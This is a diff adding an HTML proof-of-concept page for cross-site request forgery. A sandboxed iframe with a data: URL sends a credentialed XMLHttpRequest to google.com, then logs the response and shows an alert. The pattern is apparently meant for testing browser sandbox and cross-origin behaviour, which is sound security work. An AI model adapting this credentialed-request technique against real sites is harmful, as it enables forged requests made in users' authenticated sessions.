@@ -1,0 +1,20 @@
+<html>
+  <body>
+    <h1>XSRF PoC using IFrame allowing sandbox restrictions</h1>
+    <script>
+
+    </script>
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script> const xhr = new XMLHttpRequest();xhr.open("GET", "http://www.google.com",true);
+       xhr.responseType = "json";
+      xhr.withCredentials = true;
+      xhr.onreadystatechange = function() {
+    if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+        console.log(xhr.responseText);
+        alert("hi");
+    }
+}
+      xhr.send(null);</script>'></iframe>
+  </body>
+</html>
+
+
